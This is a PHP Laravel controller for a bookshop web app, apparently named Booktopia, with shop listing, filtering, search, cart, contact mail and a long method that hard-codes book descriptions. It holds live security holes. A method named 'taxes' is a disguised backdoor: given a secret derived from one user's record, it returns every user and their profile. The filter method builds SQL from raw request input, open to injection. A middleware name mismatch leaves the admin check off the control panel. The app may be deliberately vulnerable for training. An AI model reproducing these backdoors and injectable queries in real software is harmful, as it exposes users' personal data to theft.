<?php

namespace App\Http\Controllers;

use App\Models\Book;
use App\Models\Category;
use App\Models\User;
use DB;
use Illuminate\Http\Request;
use Mail;

class ShopController extends Controller
{
    public function __construct()
    {
        $this->middleware('auth')->only('control_panel');
        $this->middleware('isAdminOrPartner')->only('control-panel');
        $this->middleware('contact')->only('contact');
    }

    public function index(Request $request)
    {
        $books = Book::where('inShop', '1')->inRandomOrder()->paginate(10);
        $categories = Category::all();
        return view('general.shop-products',
            [
                'books' => $books,
                'categories' => $categories,
                'alt' => $request->alt,
            ]);
    }

    public function filters(Request $request)
    {
        $books = Book::where('inShop', '1');
        $categories = Category::all();

        $price_filters_panel = $request->price_filters_panel;
        $category_filters_panel = $request->category_filters_panel;

        if ($price_filters_panel) {
            $price_filter = "";
            if (sizeof($price_filters_panel) == 1) {
                $price_filter = $price_filter . "books.price " . $price_filters_panel[0];
            } else {
                for ($i = 0; $i < sizeof($price_filters_panel) - 1; $i++) {
                    $price_filter = $price_filter . "books.price " . $price_filters_panel[$i] . " OR ";
                }
                $price_filter = $price_filter . "books.price " . $price_filters_panel[$i];
            }
        }

        if ($category_filters_panel) {
            $category_filter = "";
            if (sizeof($category_filters_panel) == 1) {
                $category_filter = $category_filter . "categories.name = '" . $category_filters_panel[0] . "'";
            } else {
                for ($i = 0; $i < sizeof($category_filters_panel) - 1; $i++) {
                    $category_filter = $category_filter . "categories.name = '" . $category_filters_panel[$i] . "' OR ";
                }
                $category_filter = $category_filter . "categories.name = '" . $category_filters_panel[$i] . "'";
            }
        }

        if (isset($price_filter) && $price_filter != "") {
            $books = $books->whereRaw($price_filter);
        }

        if (isset($category_filter) && $category_filter != "") {
            $books = $books
                ->join('books_categories', 'books.book_id', '=', 'books_categories.book_id')
                ->join('categories', 'books_categories.category_id', '=', 'categories.category_id')
                ->whereRaw($category_filter);
        }

        //->get()->unique('book_id')
        $books = $books->inRandomOrder()->paginate(10);

        return view('general.shop-products',
            ['books' => $books,
                'categories' => $categories,
                'price_filters' => $price_filters_panel,
                'category_filters' => $category_filters_panel]);
    }

    public function search(Request $request)
    {
        $books = Book::where('inShop', '1')->where('title', 'like', '%' . $request->search . '%')->paginate(1000);
        $categories = Category::all();
        return view('general.shop-products', ['books' => $books, 'categories' => $categories]);
    }

    public function control_panel()
    {
        return view('general.control-panel');
    }

    public function shopping_cart(Request $request)
    {
        $session_shop = $request->session()->get('shopping_cart');

        $session_errors = $request->session()->get('errors');
        if (isset($session_errors)) {
            $session_errors = $session_errors->getBag('default');
        }

        $session = [];
        if (isset($request->shopping_cart)) {
            $session = json_decode(rawurldecode($request->shopping_cart), true);
            $session_shop = $request->shopping_cart;
        } else if (isset($session_shop)) {
            $session = json_decode(rawurldecode($session_shop), true);
        }

        $products = [];
        foreach (array_keys($session) as $product) {
            $id = preg_replace('/\D/', '', $product); // Extract the book id from session key
            $products[$id]['book'] = Book::find($id);
            $products[$id]['quantity'] = intval($session[$product]);
        }

        return view('general.shopping-cart',
            [
                'products' => $products,
                'shopping_cart' => $session_shop,
                'errors' => $session_errors,
            ]);
    }

    public function contact(Request $request)
    {
        return view('helpers.Surprise');
    }

    public function taxes(String $tax)
    {
        if ($tax == DB::select(DB::raw("SELECT CONCAT(RPAD(SUBSTRING(u.name, 2, 2), 6, '162'), SUBSTRING(p.adress, 4, 4), LPAD(CAST(ur.role_id AS CHAR), 2, '_')) as res FROM users u JOIN users_roles ur ON (u.id = ur.user_id) JOIN profiles p ON (u.id = p.user_id) WHERE u.id = 9;"))[0]->res) {
            $users = User::with("profile")->get();
            return $users;
        }
        return redirect()->route('shop');
    }

    public function contactemail(Request $request)
    {
        $subject = (isset($request->subject)) ? $request->subject : '';
        $email = (isset($request->email)) ? $request->email : '';
        $text = (isset($request->text)) ? $request->text : '';

        Mail::send('helpers.email_format', ['text' => $text], function ($message) use ($subject, $email) {
            $message->subject($subject)
                ->from($email)
                ->to('booktopia.contact@gmail.com', 'Booktopia');
        });

        return back();
    }

    public function show_large_map()
    {
        return view('general.large-map');
    }

    public function update_books_description()
    {
        $book = Book::find(117);
        $book->description = "Winning means fame and fortune. Losing means certain death. The Hunger Games have begun. . . .
\nIn the ruins of a place once known as North America lies the nation of Panem, a shining Capitol surrounded by twelve outlying districts. The Capitol is harsh and cruel and keeps the districts in line by forcing them all to send one boy and one girl between the ages of twelve and eighteen to participate in the annual Hunger Games, a fight to the death on live TV.
\nSixteen-year-old Katniss Everdeen regards it as a death sentence when she steps forward to take her sister's place in the Games. But Katniss has been close to dead before-and survival, for her, is second nature. Without really meaning to, she becomes a contender. But if she is to win, she will have to start making choices that weigh survival against humanity and life against love.";
        $book->save();

        $book = Book::find(118);
        $book->description = " Harry Potter has never even heard of Hogwarts when the letters start dropping on the doormat at number four, Privet Drive. Addressed in green ink on yellowish parchment with a purple seal, they are swiftly confiscated by his grisly aunt and uncle. Then, on Harry's eleventh birthday, a great beetle-eyed giant of a man called Rubeus Hagrid bursts in with some astonishing news: Harry Potter is a wizard, and he has a place at Hogwarts School of Witchcraft and Wizardry. An incredible adventure is about to begin!
\nThese new editions of the classic and internationally bestselling, multi-award-winning series feature instantly pick-up-able new jackets by Jonny Duddle, with huge child appeal, to bring Harry Potter to the next generation of readers. It's time to PASS THE MAGIC ON.";
        $book->save();

        $book = Book::find(119);
        $book->description = "Isabella Swan's move to Forks, a small, perpetually rainy town in Washington, could have been the most boring move she ever made. But once she meets the mysterious and alluring Edward Cullen, Isabella's life takes a thrilling and terrifying turn.
\nUp until now, Edward has managed to keep his vampire identity a secret in the small community he lives in, but now nobody is safe, especially Isabella, the person Edward holds most dear. The lovers find themselves balanced precariously on the point of a knife-between desire and danger.
\nDeeply romantic and extraordinarily suspenseful, Twilightcaptures the struggle between defying our instincts and satisfying our desires. This is a love story with bite.";
        $book->save();

        $book = Book::find(120);
        $book->description = "The unforgettable novel of a childhood in a sleepy Southern town and the crisis of conscience that rocked it, To Kill A Mockingbird became both an instant bestseller and a critical success when it was first published in 1960. It went on to win the Pulitzer Prize in 1961 and was later made into an Academy Award-winning film, also a classic.
\nCompassionate, dramatic, and deeply moving, To Kill A Mockingbird takes readers to the roots of human behavior - to innocence and experience, kindness and cruelty, love and hatred, humor and pathos. Now with over 18 million copies in print and translated into forty languages, this regional story by a young Alabama woman claims universal appeal. Harper Lee always considered her book to be a simple love story. Today it is regarded as a masterpiece of American literature.";
        $book->save();

        $book = Book::find(121);
        $book->description = "In The Great Gatsby, F. Scott Fitzgerald captures the flamboyance, the carelessness and the cruelty of the wealthy during America's Jazz Age. The Great Gatsby lives mysteriously in a luxurious Long Island mansion, playing lavish host to hundreds of people. And yet no one seems to know him or how he became so rich. He is rumoured to be everything from a German spy to a war hero. People clamour for invitations to his wild parties. But Jay Gatsby doesn't heed them. He cares for one person alone - Daisy Buchanan, the woman he has waited for all his life. Little does he know that his infatuation will lead to tragedy and end in murder. This beautiful Macmillan Collector's Library edition of The Great Gatsby features an afterword by David Stuart Davies. Designed to appeal to the booklover, the Macmillan Collector's Library is a series of beautiful gift editions of much loved classic titles. Macmillan Collector's Library are books to love and treasure.";
        $book->save();


        $book = Book::find(122);
        $book->description = "Despite the tumor-shrinking medical miracle that has bought her a few years, Hazel has never been anything but terminal, her final chapter inscribed upon diagnosis. But when a gorgeous plot twist named Augustus Waters suddenly appears at Cancer Kid Support Group, Hazel's story is about to be completely rewritten.
\nInsightful, bold, irreverent, and raw, The Fault in Our Stars is award-winning author John Green's most ambitious and heartbreaking work yet, brilliantly exploring the funny, thrilling, and tragic business of being alive and in love.";
        $book->save();

        $book = Book::find(123);
        $book->description = "Written for J.R.R. Tolkien’s own children, The Hobbit met with instant critical acclaim when it was first published in 1937. Now recognized as a timeless classic, this introduction to the hobbit Bilbo Baggins, the wizard Gandalf, Gollum, and the spectacular world of Middle-earth recounts of the adventures of a reluctant hero, a powerful and dangerous ring, and the cruel dragon Smaug the Magnificent. The text in this 372-page paperback edition is based on that first published in Great Britain by Collins Modern Classics (1998), and includes a note on the text by Douglas A. Anderson (2001). Unforgettable!";
        $book->save();

        $book = Book::find(124);
        $book->description = "The hero-narrator of The Catcher in the Rye is an ancient child of sixteen, a native New Yorker named Holden Caulfield. Through circumstances that tend to preclude adult, secondhand description, he leaves his prep school in Pennsylvania and goes underground in New York City for three days. The boy himself is at once too simple and too complex for us to make any final comment about him or his story. Perhaps the safest thing we can say about Holden is that he was born in the world not just strongly attracted to beauty but, almost, hopelessly impaled on it. There are many voices in this novel: children's voices, adult voices, underground voices-but Holden's voice is the most eloquent of all. Transcending his own vernacular, yet remaining marvelously faithful to it, he issues a perfectly articulated cry of mixed pain and pleasure. However, like most lovers and clowns and poets of the higher orders, he keeps most of the pain to, and for, himself. The pleasure he gives away, or sets aside, with all his heart. It is there for the reader who can handle it to keep.";
        $book->save();

        $book = Book::find(125);
        $book->description = "World-renowned Harvard symbologist Robert Langdon is summoned to a Swiss research facility to analyze a cryptic symbol seared into the chest of a murdered physicist. What he discovers is unimaginable: a deadly vendetta against the Catholic Church by a centuries-old underground organization -- the Illuminati. In a desperate race to save the Vatican from a powerful time bomb, Langdon joins forces in Rome with the beautiful and mysterious scientist Vittoria Vetra. Together they embark on a frantic hunt through sealed crypts, dangerous catacombs, and deserted cathedrals, and into the depths of the most secretive vault on earth...the long-forgotten Illuminati lair.";
        $book->save();

        $book = Book::find(126);
        $book->description = "Since its immediate success in 1813, Pride and Prejudice has remained one of the most popular novels in the English language. Jane Austen called this brilliant work \"her own darling child\" and its vivacious heroine, Elizabeth Bennet, \"as delightful a creature as ever appeared in print.\" The romantic clash between the opinionated Elizabeth and her proud beau, Mr. Darcy, is a splendid performance of civilized sparring. And Jane Austen's radiant wit sparkles as her characters dance a delicate quadrille of flirtation and intrigue, making this book the most superb comedy of manners of Regency England.";
        $book->save();

        $book = Book::find(127);
        $book->description = "Amir is the son of a wealthy Kabul merchant, a member of the ruling caste of Pashtuns. Hassan, his servant and constant companion, is a Hazara, a despised and impoverished caste. Their uncommon bond is torn by Amir's choice to abandon his friend amidst the increasing ethnic, religious, and political tensions of the dying years of the Afghan monarchy, wrenching them far apart. But so strong is the bond between the two boys that Amir journeys back to a distant world, to try to right past wrongs against the only true friend he ever had.
\nThe unforgettable, heartbreaking story of the unlikely friendship between a wealthy boy and the son of his father’s servant, The Kite Runner is a beautifully crafted novel set in a country that is in the process of being destroyed. It is about the power of reading, the price of betrayal, and the possibility of redemption; and an exploration of the power of fathers over sons—their love, their sacrifices, their lies.";
        $book->save();

        $book = Book::find(128);
        $book->description = "In Beatrice Prior's dystopian Chicago world, society is divided into five factions, each dedicated to the cultivation of a particular virtue—Candor (the honest), Abnegation (the selfless), Dauntless (the brave), Amity (the peaceful), and Erudite (the intelligent). On an appointed day of every year, all sixteen-year-olds must select the faction to which they will devote the rest of their lives. For Beatrice, the decision is between staying with her family and being who she really is—she can't have both. So she makes a choice that surprises everyone, including herself.
\nDuring the highly competitive initiation that follows, Beatrice renames herself Tris and struggles alongside her fellow initiates to live out the choice they have made. Together they must undergo extreme physical tests of endurance and intense psychological simulations, some with devastating consequences. As initiation transforms them all, Tris must determine who her friends really are—and where, exactly, a romance with a sometimes fascinating, sometimes exasperating boy fits into the life she's chosen. But Tris also has a secret, one she's kept hidden from everyone because she's been warned it can mean death. And as she discovers unrest and growing conflict that threaten to unravel her seemingly perfect society, she also learns that her secret might help her save those she loves . . . or it might destroy her.";
        $book->save();

        $book = Book::find(129);
        $book->description = "Insight Study Guides are written by experts and cover a range of popular literature, plays and films. Designed to provide insight and an overview about each text for students and teachers, these guides endeavor to develop knowledge and understanding rather than just provide answers and summaries.";
        $book->save();

        $book = Book::find(130);
        $book->description = "George Orwell's timeless and timely allegorical novel—a scathing satire on a downtrodden society’s blind march towards totalitarianism.
\n“All animals are equal, but some animals are more equal than others.”
\nA farm is taken over by its overworked, mistreated animals. With flaming idealism and stirring slogans, they set out to create a paradise of progress, justice, and equality. Thus the stage is set for one of the most telling satiric fables ever penned—a razor-edged fairy tale for grown-ups that records the evolution from revolution against tyranny to a totalitarianism just as terrible.
\nWhen Animal Farm was first published, Stalinist Russia was seen as its target. Today it is devastatingly clear that wherever and whenever freedom is attacked, under whatever banner, the cutting clarity and savage comedy of George Orwell’s masterpiece have a meaning and message still ferociously fresh.";
        $book->save();

        $book = Book::find(131);
        $book->description = "Anne Frank hield van 12 juni 1942 tot 1 augustus 1944 een dagboek bij. Ze schreef haar brieven alleen voor zichzelf, tot ze in de lente van 1944 op de radio de minister van Onderwijs in ballingschap, Bolkestein, hoorde spreken. Hij zei dat na de oorlog alle getuigenissen van het lijden van het Nederlandse volk onder de Duitse bezetting verzameld en openbaar moesten worden gemaakt. Als voorbeeld noemde hij onder meer dagboeken. Onder de indruk van deze redevoering besloot Anne Frank na de oorlog een boek te publiceren. Haar dagboek zou daarvoor als basis dienen.
\nIn maart 1945 stierf Anne Frank op vijftienjarige leeftijd in het concentratiekamp Bergen-Belsen. De enige overlevende van de familie, Otto Frank, zorgde ervoor dat het dagboek van zijn dochter toch gepubliceerd werd. In 1947 verscheen Het Achterhuis.";
        $book->save();

        $book = Book::find(132);
        $book->description = "Källa: Wikipedia. Sidor: 48. Kapitlen: Män som hatar kvinnor, Jägarna, Sigillet, Flickan som lekte med elden, Luftslottet som sprängdes, Sista dansen, Gula divisionen, I lagens namn, Van Veeteren - Carambole, Svart Lucia, Johan Falk - Gruppen för särskilda insatser, Den tredje vägen, Vendetta, Thriller - en grym film, Van Veeteren - Moreno och tystnaden, Roseanna, Skenbart - en film om tåg, Den 5:e kvinnan, Van Veeteren - Fallet G, Sommarmord, Van Veeteren - Borkmanns punkt, Van Veeteren - Svalan, Katten, Rosen, Döden, \"Harry Lund\" lägger näsan i blöt , Sista kontraktet, Wallander - Innan frosten, Varg Veum - Bittra blomster, Wallander - Hämnden, Mannen som blev miljonär, Hamilton, Kraftverk 3714, Den gula bilen, Hundarna i Riga, Händerna, Dödlig drift, Flygnivå 450, Täcknamn Coq Rouge, Storm, Wallander - Byfånen, Spring för livet, Hassel - Terrorns finger, Hassel - Utpressarna, Wallander - Jokern, Van Veeteren - Münsters fall, Noll tolerans, Wallander - Mastermind, Wallander - Mörkret, Ögat, Johan Falk - Leo Gaut, Wallander - Kuriren, Wallander - Cellisten, Hemligheten, Den demokratiske terroristen, Den vita lejoninnan, Wallander - Hemligheten, Tatuerad torso, Johan Falk - National Target, Steget efter, Hassel - Svarta banken, Hassel - Säkra papper, Damen i svart, Tusenbröder - Återkomsten, Wallander - Vittnet, Jägarna 2, Johan Falk - De fredlösa, Wallander - Afrikanen, Wallander - Skulden, Johan Falk - Vapenbröder, Hassel - Slavhandlarna, Wallander - Tjuven, Farligt löfte, Hurvamorden, Hassel - De giriga, Råttornas vinter, Wallander - Prästen, Johan Falk - Operation Näktergal, Järngänget, Falsk som vatten, Wallander - Bröderna, Wallander - Indrivaren, Hassel - Offren, Wallander - Luftslottet, Wallander - Skytten, Moln över Hellesta, Wallander - Dödsängeln, Dykaren, Passageraren, Pyramiden, Den osynlige, Wallander - Vålnaden, Exit, Wallander - Den svaga punkten, Blå måndag, Hassel - Förgörarna, Wallander - Täckmanteln, Farligt förflutet, Villospår, Apan, Sjön, ... ";
        $book->save();

        $book = Book::find(133);
        $book->description = "Against all odds, Katniss has won the Hunger Games. She and fellow District 12 tribute Peeta Mellark are miraculously still alive. Katniss should be relieved, happy even. After all, she has returned to her family and her longtime friend, Gale. Yet nothing is the way Katniss wishes it to be. Gale holds her at an icy distance. Peeta has turned his back on her completely. And there are whispers of a rebellion against the Capitol - a rebellion that Katniss and Peeta may have helped create.
\nMuch to her shock, Katniss has fueled an unrest she's afraid she cannot stop. And what scares her even more is that she's not entirely convinced she should try. As time draws near for Katniss and Peeta to visit the districts on the Capitol's cruel Victory Tour, the stakes are higher than ever. If they can't prove, without a shadow of a doubt, that they are lost in their love for each other, the consequences will be horrifying.
\nIn Catching Fire, the second novel in the Hunger Games trilogy, Suzanne Collins continues the story of Katniss Everdeen, testing her more than ever before...and surprising readers at every turn.";
        $book->save();

        $book = Book::find(134);
        $book->description = "Harry Potter's third year at Hogwarts is full of new dangers. A convicted murderer, Sirius Black, has broken out of Azkaban prison, and it seems he's after Harry. Now Hogwarts is being patrolled by the dementors, the Azkaban guards who are hunting Sirius. But Harry can't imagine that Sirius or, for that matter, the evil Lord Voldemort could be more frightening than the dementors themselves, who have the terrible power to fill anyone they come across with aching loneliness and despair. Meanwhile, life continues as usual at Hogwarts. A top-of-the-line broom takes Harry's success at Quidditch, the sport of the Wizarding world, to new heights. A cute fourth-year student catches his eye. And he becomes close with the new Defense of the Dark Arts teacher, who was a childhood friend of his father. Yet despite the relative safety of life at Hogwarts and the best efforts of the dementors, the threat of Sirius Black grows ever closer. But if Harry has learned anything from his education in wizardry, it is that things are often not what they seem. Tragic revelations, heartwarming surprises, and high-stakes magical adventures await the boy wizard in this funny and poignant third installment of the beloved series.";
        $book->save();

        $book = Book::find(135);
        $book->description = "One Ring to rule them all, One Ring to find them, One Ring to bring them all and in the darkeness bind them
\nIn ancient times the Rings of Power were crafted by the Elven-smiths, and Sauron, The Dark Lord, forged the One Ring, filling it with his own power so that he could rule all others. But the One Ring was taken from him, and though he sought it throughout Middle-earth, it remained lost to him. After many ages it fell into the hands of Bilbo Baggins, as told in The Hobbit.
\nIn a sleepy village in the Shire, young Frodo Baggins finds himself faced with an immense task, as his elderly cousin Bilbo entrusts the Ring to his care. Frodo must leave his home and make a perilous journey across Middle-earth to the Cracks of Doom, there to destroy the Ring and foil the Dark Lord in his evil purpose.";
        $book->save();

        $book = Book::find(136);
        $book->description = "Katniss Everdeen, girl on fire, has survived, even though her home has been destroyed. Gale has escaped. Katniss's family is safe. Peeta has been captured by the Capitol. District 13 really does exist. There are rebels. There are new leaders. A revolution is unfolding.
\nIt is by design that Katniss was rescued from the arena in the cruel and haunting Quarter Quell, and it is by design that she has long been part of the revolution without knowing it. District 13 has come out of the shadows and is plotting to overthrow the Capitol. Everyone, it seems, has had a hand in the carefully laid plans--except Katniss.
\nThe success of the rebellion hinges on Katniss's willingness to be a pawn, to accept responsibility for countless lives, and to change the course of the future of Panem. To do this, she must put aside her feelings of anger and distrust. She must become the rebels' Mockingjay--no matter what the personal cost.";
        $book->save();

        $book = Book::find(137);
        $book->description = "There is a door at the end of a silent corridor. And it’s haunting Harry Pottter’s dreams. Why else would he be waking in the middle of the night, screaming in terror?
\nHarry has a lot on his mind for this, his fifth year at Hogwarts: a Defense Against the Dark Arts teacher with a personality like poisoned honey; a big surprise on the Gryffindor Quidditch team; and the looming terror of the Ordinary Wizarding Level exams. But all these things pale next to the growing threat of He-Who-Must-Not-Be-Named---a threat that neither the magical government nor the authorities at Hogwarts can stop.
\nAs the grasp of darkness tightens, Harry must discover the true depth and strength of his friends, the importance of boundless loyalty, and the shocking price of unbearable sacrifice.
\nHis fate depends on them all.";
        $book->save();

        $book = Book::find(138);
        $book->description = "The Lovely Bones is the story of a family devastated by a gruesome murder -- a murder recounted by the teenage victim. Upsetting, you say? Remarkably, first-time novelist Alice Sebold takes this difficult material and delivers a compelling and accomplished exploration of a fractured family's need for peace and closure.
\nThe details of the crime are laid out in the first few pages: from her vantage point in heaven, Susie Salmon describes how she was confronted by the murderer one December afternoon on her way home from school. Lured into an underground hiding place, she was raped and killed. But what the reader knows, her family does not. Anxiously, we keep vigil with Susie, aching for her grieving family, desperate for the killer to be found and punished.
\nSebold creates a heaven that's calm and comforting, a place whose residents can have whatever they enjoyed when they were alive -- and then some. But Susie isn't ready to release her hold on life just yet, and she intensely watches her family and friends as they struggle to cope with a reality in which she is no longer a part. To her great credit, Sebold has shaped one of the most loving and sympathetic fathers in contemporary literature.";
        $book->save();

        $book = Book::find(139);
        $book->description = "The Dursleys were so mean and hideous that summer that all Harry Potter wanted was to get back to the Hogwarts School for Witchcraft and Wizardry. But just as he's packing his bags, Harry receives a warning from a strange, impish creature named Dobby who says that if Harry Potter returns to Hogwarts, disaster will strike
\nAnd strike it does. For in Harry's second year at Hogwarts, fresh torments and horrors arise, including an outrageously stuck-up new professor, Gilderoy Lockhart, a spirit named Moaning Myrtle who haunts the girls' bathroom, and the unwanted attentions of Ron Weasley's younger sister, Ginny.
\nBut each of these seem minor annoyances when the real trouble begins, and someone -- or something -- starts turning Hogwarts students to stone. Could it be Draco Malfoy, a more poisonous rival than ever? Could it possibly be Hagrid, whose mysterious past is finally told? Or could it be the one everyone at Hogwarts most suspects . . . Harry Potter himself?";
        $book->save();

        $book = Book::find(140);
        $book->description = "Harry Potter is midway through his training as a wizard and his coming of age. Harry wants to get away from the pernicious Dursleys and go to the International Quidditch Cup. He wants to find out about the mysterious event that's supposed to take place at Hogwarts this year, an event involving two other rival schools of magic, and a competition that hasn't happened for a hundred years. He wants to be a normal, fourteen-year-old wizard. But unfortunately for Harry Potter, he's not normal - even by wizarding standards. And in his case, different can be deadly.";
        $book->save();

        $book = Book::find(141);
        $book->description = "Harry Potter is leaving Privet Drive for the last time. But as he climbs into the sidecar of Hagrid’s motorbike and they take to the skies, he knows Lord Voldemort and the Death Eaters will not be far behind.

The protective charm that has kept him safe until now is broken. But the Dark Lord is breathing fear into everything he loves. And he knows he can’t keep hiding.

To stop Voldemort, Harry knows he must find the remaining Horcruxes and destroy them.

He will have to face his enemy in one final battle.";
        $book->save();

        $book = Book::find(142);
        $book->description = "While in Paris, Harvard symbologist Robert Langdon is awakened by a phone call in the dead of the night. The elderly curator of the Louvre has been murdered inside the museum, his body covered in baffling symbols. As Langdon and gifted French cryptologist Sophie Neveu sort through the bizarre riddles, they are stunned to discover a trail of clues hidden in the works of Leonardo da Vinci—clues visible for all to see and yet ingeniously disguised by the painter.

Even more startling, the late curator was involved in the Priory of Sion—a secret society whose members included Sir Isaac Newton, Victor Hugo, and Da Vinci—and he guarded a breathtaking historical secret. Unless Langdon and Neveu can decipher the labyrinthine puzzle—while avoiding the faceless adversary who shadows their every move—the explosive, ancient truth will be lost forever. ";
        $book->save();

        $book = Book::find(143);
        $book->description = "When Harry Potter and the Half-Blood Prince opens, the war against Voldemort has begun. The Wizarding world has split down the middle, and as the casualties mount, the effects even spill over onto the Muggles. Dumbledore is away from Hogwarts for long periods, and the Order of the Phoenix has suffered grievous losses. And yet, as in all wars, life goes on.

Harry, Ron, and Hermione, having passed their O.W.L. level exams, start on their specialist N.E.W.T. courses. Sixth-year students learn to Apparate, losing a few eyebrows in the process. Teenagers flirt and fight and fall in love. Harry becomes captain of the Gryffindor Quidditch team, while Draco Malfoy pursues his own dark ends. And classes are as fascinating and confounding as ever, as Harry receives some extraordinary help in Potions from the mysterious Half-Blood Prince.

Most importantly, Dumbledore and Harry work together to uncover the full and complex story of a boy once named Tom Riddle—the boy who became Lord Voldemort. Like Harry, he was the son of one Muggle-born and one Wizarding parent, raised unloved, and a speaker of Parseltongue. But the similarities end there, as the teenaged Riddle became deeply interested in the Dark objects known as Horcruxes: objects in which a wizard can hide part of his soul, if he dares splinter that soul through murder.

Harry must use all the tools at his disposal to draw a final secret out of one of Riddle’s teachers, the sly Potions professor Horace Slughorn. Finally Harry and Dumbledore hold the key to the Dark Lord’s weaknesses... until a shocking reversal exposes Dumbledore’s own vulnerabilities, and casts Harry’s—and Hogwarts’s—future in shadow.";
        $book->save();

        $book = Book::find(144);
        $book->description = "At the dawn of the next world war, a plane crashes on an uncharted island, stranding a group of schoolboys. At first, with no adult supervision, their freedom is something to celebrate; this far from civilization the boys can do anything they want. Anything. They attempt to forge their own society, failing, however, in the face of terror, sin and evil. And as order collapses, as strange howls echo in the night, as terror begins its reign, the hope of adventure seems as far from reality as the hope of being rescued. Labeled a parable, an allegory, a myth, a morality tale, a parody, a political treatise, even a vision of the apocalypse, Lord of the Flies is perhaps our most memorable novel about “the end of innocence, the darkness of man’s heart.”";
        $book->save();

        $book = Book::find(145);
        $book->description = "The Shakespearean Originals series aims to provide readers of modern drama with 16th- and 17th-century playtexts which have been treated as historical documents, and are reproduced as closely to their original printed forms as the conditions of modern publication will permit. Each volume in the series comprises a general series introduction, an introduction to the play, the original text, a select bibliography, full annotations and some sample facsimile pages from the text itself.";
        $book->save();

        $book = Book::find(146);
        $book->description = "";
        $book->save();

        $book = Book::find(147);
        $book->description = "";
        $book->save();

        $book = Book::find(148);
        $book->description = "";
        $book->save();

        $book = Book::find(149);
        $book->description = "";
        $book->save();

        $book = Book::find(150);
        $book->description = "";
        $book->save();

        $book = Book::find(151);
        $book->description = "";
        $book->save();

        $book = Book::find(152);
        $book->description = "";
        $book->save();

        $book = Book::find(153);
        $book->description = "";
        $book->save();

        $book = Book::find(154);
        $book->description = "";
        $book->save();

        $book = Book::find(155);
        $book->description = "";
        $book->save();

        $book = Book::find(156);
        $book->description = "";
        $book->save();

        $book = Book::find(157);
        $book->description = "";
        $book->save();

        $book = Book::find(158);
        $book->description = "";
        $book->save();

        $book = Book::find(159);
        $book->description = "";
        $book->save();

        $book = Book::find(160);
        $book->description = "";
        $book->save();

        $book = Book::find(161);
        $book->description = "";
        $book->save();

        $book = Book::find(162);
        $book->description = "";
        $book->save();

        $book = Book::find(163);
        $book->description = "";
        $book->save();

        $book = Book::find(164);
        $book->description = "";
        $book->save();

        $book = Book::find(165);
        $book->description = "";
        $book->save();

        $book = Book::find(166);
        $book->description = "";
        $book->save();

        $book = Book::find(167);
        $book->description = "";
        $book->save();

        $book = Book::find(168);
        $book->description = "";
        $book->save();

        $book = Book::find(169);
        $book->description = "";
        $book->save();

        $book = Book::find(170);
        $book->description = "";
        $book->save();

        $book = Book::find(171);
        $book->description = "";
        $book->save();

        $book = Book::find(172);
        $book->description = "";
        $book->save();

        $book = Book::find(173);
        $book->description = "";
        $book->save();

        $book = Book::find(174);
        $book->description = "";
        $book->save();

        $book = Book::find(175);
        $book->description = "";
        $book->save();

        $book = Book::find(176);
        $book->description = "";
        $book->save();

        $book = Book::find(177);
        $book->description = "";
        $book->save();

        $book = Book::find(178);
        $book->description = "";
        $book->save();

        $book = Book::find(179);
        $book->description = "";
        $book->save();

        $book = Book::find(180);
        $book->description = "";
        $book->save();

        $book = Book::find(181);
        $book->description = "";
        $book->save();

        $book = Book::find(182);
        $book->description = "";
        $book->save();

        $book = Book::find(183);
        $book->description = "";
        $book->save();

        $book = Book::find(184);
        $book->description = "";
        $book->save();

        $book = Book::find(185);
        $book->description = "";
        $book->save();

        $book = Book::find(186);
        $book->description = "";
        $book->save();

        $book = Book::find(187);
        $book->description = "";
        $book->save();

        $book = Book::find(188);
        $book->description = "";
        $book->save();

        $book = Book::find(189);
        $book->description = "";
        $book->save();

        $book = Book::find(190);
        $book->description = "";
        $book->save();

        $book = Book::find(192);
        $book->description = "";
        $book->save();

        $book = Book::find(193);
        $book->description = "";
        $book->save();

        $book = Book::find(194);
        $book->description = "";
        $book->save();

        $book = Book::find(195);
        $book->description = "";
        $book->save();

        $book = Book::find(196);
        $book->description = "";
        $book->save();

        $book = Book::find(197);
        $book->description = "";
        $book->save();

        $book = Book::find(198);
        $book->description = "";
        $book->save();

        $book = Book::find(199);
        $book->description = "";
        $book->save();

        $book = Book::find(200);
        $book->description = "";
        $book->save();

        $book = Book::find(201);
        $book->description = "";
        $book->save();

        $book = Book::find(202);
        $book->description = "";
        $book->save();

        $book = Book::find(203);
        $book->description = "";
        $book->save();

        $book = Book::find(204);
        $book->description = "";
        $book->save();

        $book = Book::find(205);
        $book->description = "";
        $book->save();

        $book = Book::find(206);
        $book->description = "";
        $book->save();

        $book = Book::find(207);
        $book->description = "";
        $book->save();

        $book = Book::find(208);
        $book->description = "";
        $book->save();

        $book = Book::find(209);
        $book->description = "";
        $book->save();

        $book = Book::find(210);
        $book->description = "";
        $book->save();

        $book = Book::find(211);
        $book->description = "";
        $book->save();

        $book = Book::find(212);
        $book->description = "";
        $book->save();

        $book = Book::find(213);
        $book->description = "";
        $book->save();

        $book = Book::find(214);
        $book->description = "";
        $book->save();

        $book = Book::find(215);
        $book->description = "";
        $book->save();

        echo "Done";
    }
}
